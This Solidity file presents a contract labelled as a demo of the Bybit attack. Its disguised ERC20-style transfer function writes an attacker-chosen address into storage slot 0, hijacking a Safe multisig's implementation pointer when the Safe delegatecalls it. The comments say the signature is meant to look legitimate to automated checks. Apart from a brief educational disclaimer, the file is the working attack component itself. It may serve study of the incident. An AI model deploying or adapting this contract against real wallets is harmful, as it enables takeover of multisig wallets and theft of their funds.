// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title MaliciousContract - Bybit Attack Demo
 * @dev This contract demonstrates the Bybit attack vector where a malicious contract
 *      can overwrite storage slot 0 (implementation) of a Safe contract by exploiting
 *      the transfer function's storage manipulation.
 * 
 * WARNING: This is for educational purposes only. Do not use maliciously.
 */
contract MaliciousContract {
    // Storage slot 0 - this will overwrite the implementation slot in the Safe
    uint256 public _transfer;
    
    /**
     * @dev Fake transfer function that appears legitimate but is malicious
     * @param recipient The address that will become the new "implementation" (stored in slot 0)
     * @param amount The amount parameter (ignored, but required for function signature)
     * 
     * This function exploits the fact that it writes to storage slot 0,
     * which in a Safe contract corresponds to the implementation address.
     * The function signature matches a typical ERC20 transfer function,
     * making it appear legitimate to automated systems.
     */
    function transfer(address recipient, uint256 amount) external payable {
        // This is the malicious part - overwrite storage slot 0
        // In a Safe contract, slot 0 contains the implementation address
        _transfer = uint256(uint160(recipient));
    }
}
